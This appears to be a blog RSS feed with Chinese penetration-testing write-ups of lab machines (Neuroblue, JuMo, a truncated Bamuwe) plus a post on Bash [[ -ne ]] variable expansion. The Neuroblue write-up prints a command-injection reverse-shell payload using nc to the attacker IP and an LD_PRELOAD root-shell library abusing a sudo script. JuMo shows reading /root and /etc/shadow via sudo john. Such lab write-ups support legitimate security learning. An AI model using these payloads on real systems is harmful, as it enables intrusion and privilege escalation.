大佬通过对比 `[[ a -ne '$a' ]]` 和 `[[ b -ne '$a' ]]`（假设 `b` 未定义）的行为，想揭示 `[[ ]]` 内部的一个重要特性：**当一个字符串在 `[[ ]]` 内部没有被引号包围时，如果它看起来像一个合法的变量名，Bash 可能会尝试将其作为变量进行扩展 (Variable Expansion)。**

![9a30eabc231f090b377fe74e23943c46](https://7r1umphk.github.io/image/20250409090621789.jpeg)

*   **示例 1: `[[ a -ne '$a' ]]`**
    假设脚本中的随机数变量就是 `a` (例如 `a=42`)。在这个表达式中：
    1.  第一个 `a` **没有引号**。Bash 会尝试查找名为 `a` 的变量。
    2.  它找到了，值为 `42`。表达式变为 `[[ 42 -ne '$a' ]]`。
    3.  第二个 `$a` 被扩展为其值 `42`。表达式变为 `[[ 42 -ne 42 ]]`。
    4.  算术比较 `42 -ne 42` 的结果是 **false** (因为它们相等)，`[[` 命令退出状态为 **1**。
    5.  `if` 语句看到退出状态 1，条件判断为 **false**，从而跳过 `exit 1`。

*   **示例 2: `[[ b -ne '$a' ]]`**
    假设变量 `b` 未定义：
    1.  第一个 `b` **没有引号**。Bash 尝试查找名为 `b` 的变量。
    2.  未找到。根据 Bash 的设置（例如 `set -u` 是否开启），这可能导致错误，或者未定义的变量被视为空字符串或 0。
    3.  如果视为空或 0，假设 `$a` 是 42，表达式可能变为 `[[ 0 -ne 42 ]]` 或 `[[ '' -ne 42 ]]`。
    4.  `[[ 0 -ne 42 ]]` 结果为 **true** (退出状态 0)。`if` 条件满足，执行 `exit 1`。
    5.  `[[ '' -ne 42 ]]` 中空字符串不是有效整数，`-ne` 操作失败，`[[` 退出状态 **非零**。`if` 条件判断为 **false**，跳过 `exit 1`。（这更接近我们之前用 `aaa` 的情况）

**大佬想强调的是：** 输入的字符（如果未加引号且符合变量名规则）在 `[[ ]]` 这个特定上下文中，可能不会被简单地当作字面字符串，而是会触发**变量解析**的尝试。

## 与 Python 2 `input()` 的类比

这与 Python 2 的 `input()` 函数行为确实有共通之处：

*   **Python 2 `input()`:** 读取用户输入，并尝试将其作为 Python **表达式**来求值。输入 `my_var` 会查找变量 `my_var`；输入 `1+1` 会得到 `2`；输入 `aaa` (未定义) 会抛出 `NameError`。
*   **Bash `[[ unquoted_string ... ]]`:** 在特定操作符（如算术比较 `-ne`）的上下文中，未加引号的字符串 `unquoted_string` 可能被尝试作为**变量** `$unquoted_string` 进行扩展。

两者都体现了 **“输入不仅仅是字面量，而是会被解释器/Shell尝试进行某种形式的解析或求值”** 的特点。如果解析失败（Python 中 `NameError`，Bash 中算术比较因类型错误失败），或者解析后的结果满足了某种条件（Bash 中变量解析后恰好相等导致 `-ne` 为 false），都可能导致非预期的程序流程。

有空的可以去看这两个大佬的wp

II04567：

`Gmeek-html&lt;iframe src='//player.bilibili.com/player.html?isOutside=true&amp;aid=112958428482069&amp;bvid=BV1SXeje3EKg&amp;cid=500001648893827&amp;p=1' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'&gt;&lt;/iframe&gt;`

Zumpyx：

`Gmeek-html&lt;iframe src='//player.bilibili.com/player.html?isOutside=true&amp;aid=658105639&amp;bvid=BV1La4y1F7o4&amp;cid=1186380191&amp;p=1' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'&gt;&lt;/iframe&gt;`

## 结论

这次挑战的精髓在于 Bash 在 `[[ ... ]]` 算术比较上下文中独特的求值规则：

*   **变量名冲突是关键：** 输入 `a` 之所以能通过，是因为它恰好匹配了存储随机数的变量名，导致比较变成了 `value_of_a -ne value_of_a`。
*   **未定义变量视为 0：** 输入 `b`, `c` 等之所以失败，是因为它们被当作值为 0 的未定义变量，使得比较 `0 -ne non_zero_random_number` 为真。
*   **无效格式导致错误即失败：** 输入 `aaa` 能通过，是因为它无法被算术求值，导致 `[[` 命令出错（返回非零状态），从而使 `if` 条件为假。

这个案例深刻地展示了理解 Shell 底层机制的重要性，尤其是在处理用户输入和进行条件判断时。一个看似简单的比较 `[[ '$INPUTS' -ne '$a' ]]`，其行为会根据 `$INPUTS` 的内容（数字、变量名、无效字符串）而截然不同。

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:19 +0000</pubDate></item><item><title>渗透测试报告 - Neuroblue (测试靶机)</title><link>https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20Neuroblue%20%28-ce-shi-ba-ji-%29.html</link><description>## 渗透测试报告 - Neuroblue

## 1. 简介

**靶机名称**: Neuroblue
**难度**: 简单
**攻击者 IP:** `192.168.205.188` (Kali Linux)
**目标 IP:** `192.168.205.203` (Neuroblue)

## 2. 信息收集 (Enumeration)

### 2.1. 网络发现 (Network Discovery)

使用 `arp-scan` 在本地网络中探测存活主机。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l        
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.188
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       (Unknown)
192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
192.168.205.203 08:00:27:53:84:22       (Unknown) # &lt;-- 发现目标
192.168.205.254 00:50:56:ec:d6:ae       (Unknown)

Ending arp-scan 1.10.0: 256 hosts scanned in 1.871 seconds (136.83 hosts/sec). 4 responded
```

目标主机 IP 确定为 `192.168.205.203`。MAC 地址 `08:00:27:53:84:22`。

### 2.2. 端口扫描 (Port Scanning)

使用 `nmap` 对目标进行端口扫描，识别开放的 TCP 端口。

* 进行全端口扫描 (`-p-`) 确定开放端口。

  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ nmap -p- 192.168.205.203 
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 02:10 EDT
  Nmap scan report for 192.168.205.203
  Host is up (0.00014s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:53:84:22 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) # &lt;-- 确认 VirtualBox
  
  Nmap done: 1 IP address (1 host up) scanned in 5.15 seconds
  ```

  结果显示目标开放了两个常见的端口：`22 (SSH)` 和 `80 (HTTP)`。

### 2.3. Web 服务探测 (Web Enumeration)

访问 80 端口的 HTTP 服务 `http://192.168.205.203/wordpress/`。

![DVWA Login Page](https://7r1umphk.github.io/image/20250501141142075.png)

页面显示为 DVWA (Damn Vulnerable Web Application) 的登录界面。DVWA 是一个知名的故意包含漏洞的 Web 应用，用于安全测试和学习。

DVWA 通常有默认的登录凭据。

![DVWA Logged In](https://7r1umphk.github.io/image/20250501141310014.png)

## 3. 获取初始访问权限 (Initial Access - DVWA Command Injection)

### 3.1. 漏洞发现与利用 (Vulnerability Discovery &amp; Exploitation)

* **登录 DVWA:** 尝试使用 DVWA 的默认凭据 `admin` / `password`。成功登录。

  ![image-20250501141405799](https://7r1umphk.github.io/image/20250501141405948.png)

* **寻找注入点:** 浏览 DVWA 的功能模块，发现 'Command Injection' 模块。

* **初步测试:** 尝试执行简单命令，如 `127.0.0.1; id`。

  ![Initial Command Injection Attempt (Blocked)](https://7r1umphk.github.io/image/20250501141546233.png)

  初始尝试被 DVWA 的安全级别阻止。

* **降低安全级别:** DVWA 允许调整安全级别。导航到 'DVWA Security' 页面，将安全级别设置为 'Low'。

  ![Setting Security Level to Low](https://7r1umphk.github.io/image/20250501141634505.png)

* **再次测试:** 在 'Low' 安全级别下，再次尝试命令注入。输入 `127.0.0.1; id`。

  ![Successful Command Injection (Low Security)](https://7r1umphk.github.io/image/20250501141746295.png)

  命令 `id` 成功执行，确认存在命令注入漏洞。

* **构造反弹 Shell Payload:** 为了获取交互式 Shell，构造一个反弹 Shell Payload。
  Payload: `127.0.0.1;nc 192.168.205.188 8888 -e /bin/bash`

* **设置监听器:** 在攻击机 (Kali) 上使用 `nc` 设置监听器，等待反弹连接。

  ```bash
  ┌──(kali㉿kali)-[/mnt/hgfs/gx/test]
  └─$ nc -lvnp 8888            
  listening on [any] 8888 ...
  ```

* **执行 Payload:** 在 DVWA 的命令注入页面提交反弹 Shell Payload。

### 3.2. 获取 Shell (Gaining Access)

提交 Payload 后，DVWA 页面会持续加载。返回 Kali 终端，监听器应收到连接。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/test]
└─$ nc -lvnp 8888            
listening on [any] 8888 ...
connect to [192.168.205.188] from (UNKNOWN) [192.168.205.203] 35542 # &lt;-- 连接成功
```

* **稳定 Shell:** 获得的初始 Shell 通常功能有限。使用标准技术提升为功能更全的 TTY Shell。

  ```bash
  # 在反弹 shell 中执行
  script /dev/null -c bash  
  # 按 Ctrl+Z 暂停
  # 在 Kali 终端执行
  stty raw -echo; fg  
  # 按 Enter 恢复，然后继续在反弹 shell 中执行
  reset xterm  
  export TERM=xterm  
  export SHELL=/bin/bash  
  stty rows 40 columns 178 # 可选，调整大小
  ```

* **确认用户:** 检查当前用户身份。

  ```bash
  www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data) 
  ```

  成功以 `www-data` 用户身份获得初始访问权限。

## 4. 权限提升 (`www-data` -&gt; `welcome` -&gt; `root`)

### 4.1. 以 `www-data` 身份进行信息收集 (Enumeration as `www-data`)

* **探索家目录:** 检查 `/home` 目录。

  ```bash
  www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ cd /home/
  www-data@Neuroblue:/home$ ls -al
  total 12
  drwxr-xr-x  3 root    root    4096 Apr 11 22:27 .
  drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
  drwxrwxrwx  2 welcome welcome 4096 Apr 30 09:17 welcome
  ```

* **检查 `welcome` 目录:** 查看 `welcome` 用户的主目录内容。

  ```bash
  www-data@Neuroblue:/home$ cd welcome/
  www-data@Neuroblue:/home/welcome$ ls -al
  total 48
  drwxrwxrwx 2 welcome welcome  4096 Apr 30 09:17 .
  drwxr-xr-x 3 root    root     4096 Apr 11 22:27 ..
  lrwxrwxrwx 1 root    root        9 Apr 30 07:10 .bash_history -&gt; /dev/null
  -rw-r--r-- 1 welcome welcome   220 Apr 11 22:27 .bash_logout
  -rw-r--r-- 1 welcome welcome  3526 Apr 11 22:27 .bashrc
  -rw-r--r-- 1 welcome welcome   807 Apr 11 22:27 .profile
  lrwxrwxrwx 1 root    root        9 Apr 30 09:17 .viminfo -&gt; /dev/null
  -rwx--x--x 1 root    root    22208 Apr 30 08:09 2048_hack # &lt;-- 可执行文件
  -rw-r--r-- 1 root    root       44 Apr 30 07:10 user.txt # &lt;-- 用户 Flag
  ```

* **获取 User Flag:** 读取 `user.txt`。

  ```bash
  www-data@Neuroblue:/home/welcome$ cat user.txt 
  flag{user-aa85e179cb0acf7cc4da7d2afcd53488}
  ```

* **分析 `2048_hack` 程序:** 检查这个可执行文件的帮助信息。

  ```bash
  www-data@Neuroblue:/home/welcome$ ./2048_hack --help
  Usage: 2048 [OPTION] | [MODE]
  Play the game 2048 in the console
  
  Options:
    -h,  --help       Show this help message.
    -v,  --version    Press x. # &lt;-- 有趣的提示
  
  Modes:
    bluered      Use a blue-to-red color scheme (requires 256-color terminal support).
    blackwhite   The black-to-white color scheme (requires 256-color terminal support).
  ```

  提示 'Press x' 值得注意。

* **运行 `2048_hack` 并交互:** 运行程序并按 'x' 键。

  ```bash
  www-data@Neuroblue:/home/welcome$ ./2048_hack 
  # (程序启动，用户按 'x')
  ```

  ![2048_hack output after pressing x](https://7r1umphk.github.io/image/20250501142419714.png)

  程序提示凭据已保存到 `/home/welcome/.cred`。

* **获取凭据:** 查看新创建的 `.cred` 文件。

  ```bash
  www-data@Neuroblue:/home/welcome$ ls -la
  total 52
  drwxrwxrwx 2 welcome  welcome   4096 May  1 02:23 .
  drwxr-xr-x 3 root     root      4096 Apr 11 22:27 ..
  lrwxrwxrwx 1 root     root         9 Apr 30 07:10 .bash_history -&gt; /dev/null
  -rw-r--r-- 1 welcome  welcome    220 Apr 11 22:27 .bash_logout
  -rw-r--r-- 1 welcome  welcome   3526 Apr 11 22:27 .bashrc
  -rw-r--r-- 1 www-data www-data    52 May  1 02:23 .cred
  -rw-r--r-- 1 welcome  welcome    807 Apr 11 22:27 .profile
  lrwxrwxrwx 1 root     root         9 Apr 30 09:17 .viminfo -&gt; /dev/null
  -rwx--x--x 1 root     root     22208 Apr 30 08:09 2048_hack
  -rw-r--r-- 1 root     root        44 Apr 30 07:10 user.txt
  www-data@Neuroblue:/home/welcome$ cat .cred
  77656c636f6d653a666438363966363639333039613737636464
  ```

  这是一串十六进制编码的字符串。

* **解码凭据:** 使用工具（如 CyberChef 或在线转换器）将十六进制解码为 ASCII。

  ![Hex to ASCII conversion](https://7r1umphk.github.io/image/20250501142514282.png)

  解码结果为：`welcome:fd869f669309a77cdd`。这是 `welcome` 用户的凭据。

### 4.2. 切换用户 (`www-data` -&gt; `welcome`)

使用获取到的凭据切换到 `welcome` 用户。

```bash
www-data@Neuroblue:/home/welcome$ su welcome
Password: 
welcome@Neuroblue:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

成功切换到 `welcome` 用户。

### 4.3. 以 `welcome` 身份进行信息收集 (寻找提权向量)

检查 `welcome` 用户的 `sudo` 权限。

```bash
welcome@Neuroblue:/tmp$ sudo -l
Matching Defaults entries for welcome on Neuroblue:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Neuroblue:
    (root) NOPASSWD: /opt/export # &lt;-- 允许以 root 无密码执行 /opt/export
```

同时，查看 `/opt/export` 脚本的内容和权限：

```bash
welcome@Neuroblue:/tmp$ cat /opt/export
#!/bin/bash

if [ -z $1 ] ;then
        echo 'This is VMBreaker export program.'
        /usr/local/sbin/VMBreaker
        exit 1
fi

export '$1'='$2' # &lt;-- 关键：使用参数设置环境变量
export '$3'='$4'
export '$5'='$6'
export '$7'='$8'
/usr/local/sbin/VMBreaker # &lt;-- 最后执行另一个程序

welcome@Neuroblue:/tmp$ ls -al /opt/export 
-rwxr-xr-x 1 root root 207 Apr 30 08:55 /opt/export
```

**关键发现:**

1.  `welcome` 用户可以无需密码以 root 权限执行 `/opt/export`。这是提权的入口。
2.  `sudoers` 配置中包含 `env_reset`，这意味着通过 `sudo` 直接传递 `LD_PRELOAD` 环境变量（如 `sudo LD_PRELOAD=... /opt/export`）会被阻止。
3.  `/opt/export` 脚本本身存在一个**严重漏洞**：它将命令行参数直接用作 `export` 命令的参数，允许我们控制脚本内部设置的环境变量名称和值。
4.  脚本最后会执行 `/usr/local/sbin/VMBreaker`。

### 4.4. 利用策略 (Exploitation Strategy - Exploiting Script Argument Handling for LD_PRELOAD Injection)

我们的目标是利用 `/opt/export` 脚本的漏洞来设置 `LD_PRELOAD` 环境变量，从而劫持后续 `/usr/local/sbin/VMBreaker` 的执行流程。

计划：

1.  编写一个 C 文件 (`exp.c`)，包含一个构造函数 (`__attribute__((constructor))`)。这个函数会在库被加载时自动执行，其功能是设置 `uid` 和 `gid` 为 0，然后启动一个具有 root 权限的 shell (`/bin/bash -p`)。
2.  将 `exp.c` 编译成共享库文件 `/tmp/exp.so`。
3.  执行 `sudo /opt/export` 命令，巧妙地将 `LD_PRELOAD` 作为第一个参数 (`$1`)，将我们恶意库的路径 `/tmp/exp.so` 作为第二个参数 (`$2`) 传递给脚本。
4.  脚本执行到 `export '$1'='$2'` 时，就会在 **root 权限**下执行 `export LD_PRELOAD=/tmp/exp.so`。
5.  当脚本最后执行 `/usr/local/sbin/VMBreaker` 时，由于 `LD_PRELOAD` 环境变量已被设置，动态链接器会优先加载 `/tmp/exp.so`，从而执行我们的恶意代码，获得 root shell。

### 4.5. 执行利用 (Executing the Exploit)

1. **创建恶意 C 代码:**
   切换到可写目录 `/tmp`，创建 `exp.c` 文件。

   ```bash
   welcome@Neuroblue:~$ cd /tmp
   welcome@Neuroblue:/tmp$ cat &lt;&lt; EOF &gt; exp.c
   #define _GNU_SOURCE
   #include &lt;stdio.h&gt;
   #include &lt;stdlib.h&gt;
   #include &lt;unistd.h&gt;
   #include &lt;dlfcn.h&gt;
   
   // 构造函数，在库加载时自动执行
   void __attribute__((constructor)) _init() {
       unsetenv('LD_PRELOAD'); // 清理环境变量，避免影响子shell
       setuid(0);             // 设置UID为root
       setgid(0);             // 设置GID为root
       system('/bin/bash -p'); // 执行一个保留权限的root shell
       exit(0); // 执行完shell后退出，避免后续程序执行（可选）
   }
   EOF
   ```

2. **编译共享库:**
   使用 `gcc` 编译 C 代码为共享库。

   ```bash
   welcome@Neuroblue:/tmp$ gcc -fPIC -shared -o /tmp/exp.so /tmp/exp.c -nostartfiles
   welcome@Neuroblue:/tmp$ ls -l /tmp/exp.so
   -rwxr-xr-x 1 welcome welcome 14736 May  1 02:29 /tmp/exp.so # &lt;-- 编译成功
   ```

3. **触发漏洞并注入:**
   执行 `sudo /opt/export` 命令，并传递精心构造的参数。

   ```bash
   welcome@Neuroblue:/tmp$ sudo /opt/export LD_PRELOAD /tmp/exp.so '' '' '' '' '' ''
   # 此处脚本内部执行 export LD_PRELOAD=/tmp/exp.so
   # 然后执行 /usr/local/sbin/VMBreaker
   # VMBreaker 加载时，动态链接器发现 LD_PRELOAD，加载 exp.so
   # exp.so 的构造函数被执行...
   root@Neuroblue:/tmp# 
   ```

### 4.6. 获取 Root 权限 (Gaining Root Access)

成功执行上述 `sudo` 命令后，`/tmp/exp.so` 中的构造函数被触发，我们直接获得了一个 root 权限的 shell。

```bash
root@Neuroblue:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@Neuroblue:/tmp# whoami
root
```

成功获取 root 权限。

* **获取 Root Flag:** 读取 `/root/root.txt` 文件。

  ```bash
  root@Neuroblue:/tmp# cat /root/root.txt 
  flag{root-3960a29b415a278c2d88bb0543c5f283}
  ```



**注记：** 在本报告的撰写过程中，AI 语言模型为部分章节的文本组织、概念阐述及语言优化提供了辅助支持。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20Neuroblue%20%28-ce-shi-ba-ji-%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:14 +0000</pubDate></item><item><title>渗透测试报告 - JuMo (测试靶机)</title><link>https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20JuMo%20%28-ce-shi-ba-ji-%29.html</link><description># 1. 简介

- 靶机名称: JuMo (未发布，内部测试靶机，可能后续发布于 HackMyVm)
- 难度: 低 (Low)
- 目标 IP: 192.168.205.182 (通过 arp-scan 发现)
- 攻击机 IP: 192.168.205.128
- 目标: 获取目标系统的 root 权限并找到 flag。

# 2. 信息收集 (Enumeration)

## 2.1. 主机发现

首先，使用 arp-scan 在本地网络中发现目标主机的 IP 地址。

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
# ... (其他输出) ...
192.168.205.182 08:00:27:ff:bf:ce       PCS Systemtechnik GmbH #&lt;-- 目标主机
# ... (其他输出) ...
Ending arp-scan 1.10.0: 256 hosts scanned in 2.033 seconds (125.92 hosts/sec). 4 responded
```

确认目标 IP 为 192.168.205.182。

## 2.2. 端口扫描

使用 nmap 对目标主机进行全端口扫描，以识别开放的服务。

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -p- 192.168.205.182
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 08:46 CST
Nmap scan report for 192.168.205.182
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh     #&lt;-- SSH 服务开放
80/tcp open  http    #&lt;-- HTTP 服务开放
MAC Address: 08:00:27:FF:BF:CE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

扫描结果显示目标开放了 22 (SSH) 和 80 (HTTP) 端口。

# 3. 获取初始访问权限 (Initial Foothold)

## 3.1. Web 服务探测

访问目标主机的 80 端口（ http://192.168.205.182 ）。

![image-20250411084817446](https://7r1umphk.github.io/image/20250411084824566.png)

这个提示我们在 hackmyvm 平台上查找一个名为 check 的用户。

## 3.2. 信息挖掘

在 HackMyVm 网站上搜索用户 check。

![image-20250411085044849](https://7r1umphk.github.io/image/20250411085044939.png)

找到了该用户的个人资料，其中包含一个外部链接。访问该链接：

![image-20250411085314126](https://7r1umphk.github.io/image/20250411085314150.png)

页面上有一串 Base64 编码的字符串 d2VsY29tZTpqdW1v。对其进行解码：

```bash
┌──(kali㉿kali)-[~/test]
└─$ echo 'd2VsY29tZTpqdW1v' | base64 -d
welcome:jumo
```

解码后得到 welcome:jumo，这很可能是一对 SSH 登录凭据（用户名:密码）。

## 3.3. SSH 登录

使用获取到的凭据尝试 SSH 登录：

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh welcome@192.168.205.182
# ...(SSH 连接确认)...
Password: # 输入密码 jumo
Linux JuMo 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
# ... (欢迎信息) ...
welcome@JuMo:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

成功以 welcome 用户身份登录系统。

# 4. 权限提升 (Privilege Escalation)

## 4.1. Sudo 权限检查

检查 welcome 用户拥有的 sudo 权限：

```bash
welcome@JuMo:~$ sudo -l
Matching Defaults entries for welcome on JuMo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on JuMo:
    (ALL : ALL) NOPASSWD: /usr/sbin/john   #&lt;-- 可以免密以 root 权限执行 john
```

输出显示 welcome 用户可以无需密码 (NOPASSWD) 以任何用户 (ALL:ALL) 的身份执行 /usr/sbin/john 命令。john (John the Ripper) 是一个密码破解工具。

## 4.2. 利用 Sudo 权限

由于可以以 root 身份执行 john，并且 /root 目录下的文件通常只有 root 用户可读，我们可以尝试利用 john 读取 /root 目录下的文件。

### 方法一：直接读取可能的 Flag 文件 (我的方法)

已知 /root/root.txt 包含了 flag。虽然 john 的 --wordlist 选项通常用于指定密码字典，但配合 --stdout 选项，john 会将 wordlist 的内容（或生成的候选密码）打印到标准输出。利用 sudo 权限，这可以用来读取 root 权限才能访问的文件内容。

```bash
welcome@JuMo:~$ sudo /usr/sbin/john --wordlist=/root/root.txt --stdout
Press 'q' or Ctrl-C to abort, almost any other key for status
flag{521ca933d6e159a50c2c04e7daa930f6}  #&lt;-- 读取并输出了 /root/root.txt 的内容
1p 0:00:00:00 100% 100.0p/s flag{521ca933d6e159a50c2c04e7daa930f6}
```

此命令成功读取了 /root/root.txt 文件，内容即为 flag。

### 方法二：读取可能的 Flag 文件 (ta0神的方法)

```bash
welcome@JuMo:~$ sudo /usr/sbin/john /etc/shadow --wordlist=/root/root.txt
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 100% 0g/s 100.0p/s 200.0c/s 200.0C/s flag{521ca933d6e159a50c2c04e7daa930f6} 
Session completed
```

## 4.3. 获取 Root 权限

根据群主提示我们可知root密码为root flag

```bash
welcome@JuMo:~$ su -
Password: # 输入 521ca933d6e159a50c2c04e7daa930f6
root@JuMo:~# id
uid=0(root) gid=0(root) groups=0(root)
root@JuMo:~# cat /root/root.txt
flag{521ca933d6e159a50c2c04e7daa930f6}
```

成功获取 root 权限。最终的 flag 存储在 /root/root.txt 中。

# 5. 总结

本次渗透测试通过以下步骤完成：

1. 信息收集: 使用 arp-scan 和 nmap 发现目标主机及其开放的 SSH 和 HTTP 服务。
2. 初始访问: 分析网页源代码，发现指向 HackMyVm 用户 check 的线索，进而找到其外部链接中的 Base64 编码凭据，成功通过 SSH 登录 welcome 用户。
3. 权限提升: 发现 welcome 用户可通过 sudo 免密执行 john 命令。利用此权限，通过 john --wordlist=/root/root.txt --stdout 直接读取了 /root/root.txt 中的 flag，或者通过 john /etc/shadow --wordlist=/root/root.txt 破解出 root 密码（密码恰好是 flag），最终使用 su 命令切换到 root 用户。

靶机设计巧妙，利用了信息泄露和 sudo 配置不当的漏洞，难度符合 Low 级别。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20JuMo%20%28-ce-shi-ba-ji-%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:11 +0000</pubDate></item><item><title>渗透测试报告 - Bamuwe (测试靶机)</title><link>https://7r1UMPHK.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20Bamuwe%20%28-ce-shi-ba-ji-%29.html</link><description>## 渗透测试报告 - Bamuwe

## 1. 简介

**靶机名称**: Bamuwe(未发布，内部测试靶机，可能后续发布于 HackMyVm)
**难度**: 简单
**攻击者 IP:** `192.168.205.188` (Kali Linux)
**目标 IP:** `192.168.205.197` (Bamuwe)

## 2. 信息收集 (Enumeration)

### 2.1. 网络发现 (Network Discovery)

使用 `arp-scan` 在本地网络中探测存活主机。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l           
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.188
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
# ... (其他主机) ...
192.168.205.197 08:00:27:a0:8d:89       (Unknown) # &lt;-- 发现目标
# ... (其他主机) ...

Ending arp-scan 1.10.0: 256 hosts scanned in 1.891 seconds (135.38 hosts/sec). 4 responded
```

目标主机 IP 确定为 `192.168.205.197`。MAC 地址 `08:00:27:a0:8d:89` 

### 2.2. 端口扫描 (Port Scanning)

使用 `nmap` 对目标进行端口扫描，识别开放的 TCP 端口。

* 进行全端口扫描 (`-p-`) 确定开放端口。

  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ nmap -p- 192.168.205.197
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 08:20 EDT
  Nmap scan report for 192.168.205.197
  Host is up (0.00016s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:A0:8D:89 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
  ```

  结果显示目标开放了两个常见的端口：`22 (SSH)` 和 `80 (HTTP)`。

### 2.3. Web 服务探测 (Web Enumeration)

Web 服务通常是获取初始访问权限的突破口，因此我首先检查了 80 端口的 HTTP 服务。使用 `curl` 或浏览器访问 `http://192.168.205.197`。

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.205.197                                     
&lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Library Membership Registration&lt;/title&gt;
        &lt;style&gt;
            body {
                background: #f0f2f5;
                font-family: 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 20px;
            }
            .container {
                max-width: 500px;
                margin: 40px auto;
                background: white;
                padding: 40px;
                border-radius: 12px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            h2 {
                color: #1a73e8;
                margin-bottom: 30px;
                text-align: center;
            }
            .form-group {
                margin-bottom: 20px;
            }
            label {
                display: block;
                margin-bottom: 8px;
                color: #5f6368;
                font-weight: 500;
            }
            input[type='text'], 
            input[type='password'] {
                width: 100%;
                padding: 12px;
                border: 1px solid #dadce0;
                border-radius: 6px;
                font-size: 16px;
                transition: border-color 0.2s;
            }
            input[type='text']:focus, 
            input[type='password']:focus {
                border-color: #1a73e8;
                outline: none;
            }
            input[type='submit'] {
                background: #1a73e8;
                color: white;
                padding: 14px 24px;
                border: none;
                border-radius: 6px;
                font-size: 16px;
                cursor: pointer;
                width: 100%;
                transition: background 0.2s;
            }
            input[type='submit']:hover {
                background: #1557b0;
            }
            .result {
                padding: 20px;
                background: #e8f0fe;
                border-radius: 6px;
                color: #1967d2;
                margin-top: 20px;
            }
        &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div class='container'&gt;
            &lt;h2&gt;Member Registration&lt;/h2&gt;
            &lt;form method='post'&gt;
                &lt;div class='form-group'&gt;
                    &lt;label&gt;Full Name:&lt;/label&gt;
                    &lt;input type='text' name='name'&gt;
                &lt;/div&gt;
                &lt;div class='form-group'&gt;
                    &lt;label&gt;Phone Number:&lt;/label&gt;
                    &lt;input type='text' name='tel'&gt;
                &lt;/div&gt;
                &lt;div class='form-group'&gt;
                    &lt;label&gt;Email Address:&lt;/label&gt;
                    &lt;input type='text' name='email'&gt;
                &lt;/div&gt;
                &lt;div class='form-group'&gt;
                    &lt;label&gt;Password:&lt;/label&gt;
                    &lt;input type='password' name='password'&gt;
                &lt;/div&gt;
                &lt;input type='submit' value='Register Now'&gt;
            &lt;/form&gt;
        &lt;/div&gt;
        
        &lt;!-- XML STRUCTURE EXAMPLE --&gt;
        &lt;!--
        &lt;user&gt;
          &lt;name&gt;John Doe&lt;/name&gt;
          &lt;tel&gt;123-4567890&lt;/tel&gt;
          &lt;email&gt;admin@admin.com&lt;/email&gt;
          &lt;password&gt;secret123&lt;/password&gt;
        &lt;/user&gt;
        --&gt;
